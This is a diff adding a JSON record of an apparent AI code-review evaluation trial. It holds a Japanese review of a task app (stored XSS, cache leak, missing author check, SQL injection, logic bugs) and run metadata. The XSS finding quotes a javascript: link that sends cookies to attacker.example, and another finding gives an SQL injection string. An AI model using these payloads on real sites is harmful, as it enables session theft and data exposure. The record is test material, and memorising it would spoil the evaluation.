@@ -1,0 +1,44 @@
+{
+  "trial": "W24-hk-baseline-run-d3-1",
+  "scenario": "W24",
+  "config": "hk-baseline-run",
+  "case": "d3",
+  "rep": 1,
+  "review_md": "# コードレビュー: ダッシュボードとタスクのコメント\n\n対象: `git diff HEAD`（未コミットの差分。新規ファイルを含む）\n\n確認方法: 疑わしい箇所は `node --experimental-strip-types` で関数を直接呼ぶ再現スクリプトで確かめた（スクリプトは作業ディレクトリの外の `/tmp/claude-0/-tmp-poc-trials-W24-hk-baseline-run-d3-1-app/7993e775-4412-41f9-aeb3-38d0026866bc/scratchpad/repro/repro.ts`）。`npm test`（30 件すべて通過）と `npm run typecheck`（エラーなし）も実行済み。既存のテストは通るが、以下の問題は通るテストに含まれていない。\n\n---\n\n### 1. ダッシュボードのキャッシュがユーザーを区別しない（別ユーザーの情報が見える）\n- 場所: `src/lib/dashboard.ts` `buildDashboard()`（キャッシュキーが `\"dashboard\"` の固定値）\n- 問題: キャッシュのキーに `userId` が入っていない。ある人（sato）がダッシュボードを開くと、30 秒のあいだ別の人（suzuki）が開いても sato の結果（担当タスク・期限切れ・完了率など）が返る。再現では、`buildDashboard(\"sato\")` の直後の `buildDashboard(\"suzuki\")` が `userId: \"sato\"` で、sato の 3 件を返した（suzuki の実際の担当は 2 件）。\n- 直し方: キーを `` `dashboard:${userId}` `` にする。あわせて「別ユーザーで呼んでも結果が混ざらない」テストを追加する（現在のテストは `clearCache()` を毎回呼んでいるため、この問題を検出しない）。\n- 重要度: 高\n\n### 2. コメント本文のリンクで `javascript:` URL が作れる（保存型 XSS）\n- 場所: `src/lib/comments.ts` `renderBody()`。表示は `src/app/tasks/[id]/page.tsx`（`dangerouslySetInnerHTML`）\n- 問題: 本文は HTML エスケープしてから `[文字](URL)` をリンクに変換するが、URL の scheme を確認していない。本文 `[資料](javascript:location='https://attacker.example/?c='+document.cookie)` は `<a href=\"javascript:location='https://attacker.example/?c='+document.cookie\" ...>資料</a>` になり、タスク詳細を開いた別の人がリンクを押すと Cookie が外部へ送られる（再現済み）。\n- 直し方: リンクの URL を `https:`・`http:` のみ許可し（必要なら相対パスも）、それ以外はリンクにせず本文のテキストのままにする。テストに `javascript:` と `data:` の拒否を追加する。\n- 重要度: 高\n\n### 3. コメントを編集する API が作者を確認しない\n- 場所: `src/app/api/comments/[commentId]/route.ts` `PATCH`（`updateComment()` も作者を引数に取らない）\n- 問題: `PATCH` は作者（`comment.authorId`）と `user.id` を比べないので、どのログイン済みユーザーも他人のコメントを書き換えられる。同じファイルの `DELETE` は 403 で作者を確認しているので、扱いが揃っていない。（コードを読んで確認。再現スクリプトでは動かしていない。）\n- 直し方: `DELETE` と同じく `if (comment.authorId !== user.id) return jsonError(403, ...)` を `PATCH` にも入れる。作者以外の PATCH が 403 になることをテストする。\n- 重要度: 高\n\n### 4. `countByStatus()` が共有の定数 `TASK_STATUSES` を書き換える\n- 場所: `src/lib/dashboard.ts` `countByStatus()`（`order.reverse()`）\n- 問題: `reverse()` は配列を破壊的に並べ替える。`order` は `TASK_STATUSES`（`src/lib/tasks.ts`）そのものなので、呼ぶたびに全体の並びが反転する。「完了が先頭」になるのは奇数回目の呼び出しだけで、偶数回目は `todo` が先頭になる。他の場所で `TASK_STATUSES` を使うと並びも変わる。再現: 呼び出し前 `[\"done\",\"in_progress\",\"todo\"]` → 1 回目 `[\"todo\",\"in_progress\",\"done\"]` → 2 回目 `[\"done\",\"in_progress\",\"todo\"]`。\n- 直し方: `[...order].reverse()` にする（または `TASK_STATUSES.slice().reverse()`）。「2 回呼んでも同じ結果になる」テストを追加する。\n- 重要度: 中\n\n### 5. 日曜日に「今週」が翌週の範囲になる\n- 場所: `src/lib/week.ts` `weekRange()`（`addDays(today, 1 - dow)`）\n- 問題: 月曜を週の始まりとするなら、日曜（`dow = 0`）の開始日は `today - 6` であるべきだが、`1 - 0 = +1` になる。そのため日曜には「今週が期限」が翌月曜〜翌日曜になり、当日までの今週の期限のタスクが一覧から消える。再現: 2026-11-15（日・JST）→ `{start: \"2026-11-16\", end: \"2026-11-22\"}`。正しくは `{start: \"2026-11-09\", end: \"2026-11-15\"}`。2026-11-08（日）も週の開始が 11-09 になり、同じ問題。\n- 直し方: `start = addDays(today, -((dow + 6) % 7))` にする。テストは水曜のみなので、日曜と月曜のケースを追加する。\n- 重要度: 中\n\n### 6. コメントの並び順が文字列の順序になっている\n- 場所: `src/lib/comments.ts` `formatCreatedAt()`（`toLocaleString(\"ja-JP\")`）と `listComments()`（`ORDER BY created_at, id`）\n- 問題: 作成日時を `2026/11/11 9:05:00` のような、ゼロ埋めのない形式で保存している。文字列として比べると、時の桁数が 1 桁と 2 桁で混ざる箇所（`9:xx` と `10:xx`、`1:xx` と `10:xx`）で時刻の順が逆になる。再現: 9:05 のコメントを先に、10:00 のコメントを後に追加すると、保存値は `[\"2026/11/11 10:00:00\",\"2026/11/11 9:05:00\"]`、並びは `[\"10時\",\"9時5分\"]`。\n- 直し方: `created_at` は UTC の ISO 8601（`now.toISOString()`）で保存し、画面表示のときだけ `Asia/Tokyo` に整形する（`ORDER BY created_at, id` はそのままで正しく並ぶ）。既存データがあるなら移行の要否を確認する。テストは 9 時と 10 時をまたぐ時刻で書く。\n- 重要度: 中\n\n### 7. 存在しないタスクへのコメント投稿で 500 になる\n- 場所: `src/app/api/tasks/[id]/comments/route.ts` `POST`\n- 問題: `POST` は `parseTaskId` だけを確認し、`getTask()` で存在を確認していない。外部キーが有効なので `addComment()` が例外を投げ（再現: `FOREIGN KEY constraint failed`）、そのまま 500 になる。`GET` は 404 を返しているので、扱いが揃っていない。\n- 直し方: `POST` でも `addComment()` の前に `if (!getTask(id)) return jsonError(404, \"タスクが見つかりません\")` を入れる。\n- 重要度: 中\n\n### 8. `completionRate()` がタスク 0 件で NaN を返す\n- 場所: `src/lib/dashboard.ts` `completionRate()`（表示は `src/app/dashboard/page.tsx`）\n- 問題: `done / tasks.length` が 0 除算になる。担当タスクが 0 件のユーザーのダッシュボードでは `完了率 NaN%` と表示される。再現: `completionRate([])` → `NaN`。\n- 直し方: 0 件のとき 0 を返す（または画面で「—」と表示する）。テストに空配列のケースを追加する。\n- 重要度: 中\n\n### 9. `listAssignedTasks()` が SQL を文字列連結で組み立てる（CLAUDE.md の規約 8 に違反）\n- 場所: `src/lib/dashboard.ts` `listAssignedTasks()`（`WHERE assignee = '${userId}'`）\n- 問題: `userId` を埋め込んでいるので、引用符を含む値で条件を変えられる。再現: `listAssignedTasks(\"x' OR '1'='1\")` → 全 7 件（通常の `sato` は 3 件）。現在の `userId` はログイン中のユーザーの ID（DB の `users.id`、シード済みの `sato` など）なので、今すぐ悪用される経路は見当たらない。ただし規約に反し、将来 ID の形式が変わると危険になる。\n- 直し方: `WHERE assignee = ?` とプレースホルダを使い、`.all(userId)` で渡す。\n- 重要度: 中\n\n### 10. テストが上の問題を検出できていない\n- 場所: `tests/dashboard.test.ts`、`tests/comments.test.ts`\n- 問題: `weekRange` のテストは水曜日だけ（問題 5 を検出できない）。`countByStatus` は 1 回しか呼ばない（問題 4 を検出できない）。コメントの並びは ISO 形式の日時で追加しているため、表示用の形式で並ぶかを確かめていない（問題 6）。ダッシュボードのテストは `clearCache()` を毎回呼んでいるため、キャッシュの共有（問題 1）を確認できない。\n- 直し方: 上の各問題に対応するテストを追加する（水曜・日曜・月曜の週、2 回呼び出し、2 人分のキャッシュ、時刻をまたぐ並び順、空のタスク一覧）。\n- 重要度: 低\n\n### 11. 作成日時の表示が環境の既定に依存する\n- 場所: `src/lib/comments.ts` `formatCreatedAt()`\n- 問題: `toLocaleString` の出力は ICU やロケールの版によって変わりうる。\n- 直し方: 問題 6 の修正で保存形式を ISO にすれば、同時に解消する。\n- 重要度: 低\n\n---\n\n## 修正の優先順位（マージ前に必要なもの）\n1. 問題 1（キャッシュの共有）\n2. 問題 2（`javascript:` リンク）\n3. 問題 3（PATCH の作者確認）\n4. 問題 4・5・6・7・8（いずれも表示や挙動が誤る。各 1 行程度の修正）\n5. 問題 9（規約違反。修正は 1 行）\n",
+  "review_chars": 5244,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 0.0317,
+    "tokens": {
+      "input": 32,
+      "output": 22370,
+      "cache_read": 892843,
+      "cache_creation": 57931
+    },
+    "turns": 18,
+    "permission_denials": [
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"git diff HEAD -- src/lib/db/migrations.ts src/lib/dashboard.ts src/lib/week.ts src/lib/cache.ts src/lib/comments.ts && for f in src/lib/dashboard.ts src/lib/week.ts src/lib/cache.ts src/l"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"mkdir -p /tmp/claude-0/-tmp-poc-trials-W24-hk-baseline-run-d3-1-app/7993e775-4412-41f9-aeb3-38d0026866bc/scratchpad/repro && cat > /tmp/claude-0/-tmp-poc-trials-W24-hk-baseline-run-d3-1-a"
+      }
+    ],
+    "tool_calls": {
+      "Bash": 11,
+      "Write": 3,
+      "Edit": 1
+    },
+    "skills_used": [],
+    "subagents": 0,
+    "subagent_types": {},
+    "questions": 0,
+    "active_seconds": 108,
+    "answer_key_access": [],
+    "isolation_suspects": [],
+    "final_message": "`REVIEW.md` を依頼の形式（場所・問題・直し方・重要度）に書き直し、`REVIEW.md` だけをコミットしました（`46c43ab`）。指摘は 11 件のままで、新しい指摘は足していません。コードは直していません。\n\n- 指摘ごとに「場所」「問題」「直し方」「重要度」の 4 項目を付けました。前回は重要度を見出しでまとめていたので、それを項目ごとに移しています。\n- 問題の説明には、前回の再現で確かめた入力と結果を残しました。ただし、指摘 3（PATCH の作者確認）だけはコードを読んだ判断で、再現はしていません。本文にもその旨を書いています。\n- 重要度は、高が 1・2・3、中が 4〜9、低が 10・11 です。"
+  },
+  "interventions": 0
+}
